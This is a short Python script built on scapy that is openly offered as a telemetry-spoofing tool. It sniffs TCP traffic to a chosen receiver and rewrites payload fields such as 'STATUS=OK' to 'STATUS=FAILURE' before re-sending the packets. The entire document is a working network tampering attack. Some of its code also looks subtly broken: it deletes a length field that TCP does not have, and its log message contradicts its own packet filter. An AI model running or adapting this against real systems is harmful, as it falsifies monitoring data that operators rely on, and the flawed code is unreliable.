#!/usr/bin/env python3

import argparse
import time
import os
from scapy.all import sniff, sendp, Ether, IP, TCP, Raw

TARGET_IP = None
TARGET_PORT = None
MOD_FIELD = b"STATUS=OK"
SPOOFED_VALUE = b"STATUS=FAILURE"
INTERFACE = None

def spoof_packet(packet):
    if Raw in packet and MOD_FIELD in packet[Raw].load:
        original = packet[Raw].load
        spoofed = original.replace(MOD_FIELD, SPOOFED_VALUE)

        packet[Raw].load = spoofed
        del packet[IP].chksum
        del packet[TCP].chksum
        del packet[IP].len
        del packet[TCP].len

        print(f"[+] Spoofing telemetry data:\n    Original: {original}\n    Spoofed : {spoofed}")
        sendp(packet, iface=INTERFACE, verbose=False)

def packet_filter(packet):
    return IP in packet and TCP in packet and packet[IP].dst == TARGET_IP and packet[TCP].dport == TARGET_PORT and Raw in packet

def main():
    global INTERFACE, TARGET_IP, TARGET_PORT

    parser = argparse.ArgumentParser(description="Telemetry data spoofing via packet interception")
    parser.add_argument("--interface", required=True, help="Interface to sniff and spoof on")
    parser.add_argument("--target-ip", required=True, help="Target telemetry receiver IP")
    parser.add_argument("--target-port", type=int, required=True, help="Target telemetry TCP port")
    parser.add_argument("--field", required=False, help="Field to spoof (default: STATUS=OK)")
    parser.add_argument("--spoof", required=False, help="Spoofed value (default: STATUS=FAILURE)")
    args = parser.parse_args()

    INTERFACE = args.interface
    TARGET_IP = args.target_ip
    TARGET_PORT = args.target_port

    global MOD_FIELD, SPOOFED_VALUE
    if args.field:
        MOD_FIELD = args.field.encode()
    if args.spoof:
        SPOOFED_VALUE = args.spoof.encode()

    print(f"[+] Listening on {INTERFACE} to spoof telemetry packets from {TARGET_IP}:{TARGET_PORT}")
    sniff(iface=INTERFACE, prn=spoof_packet, lfilter=packet_filter, store=0)

if __name__ == "__main__":
    main()
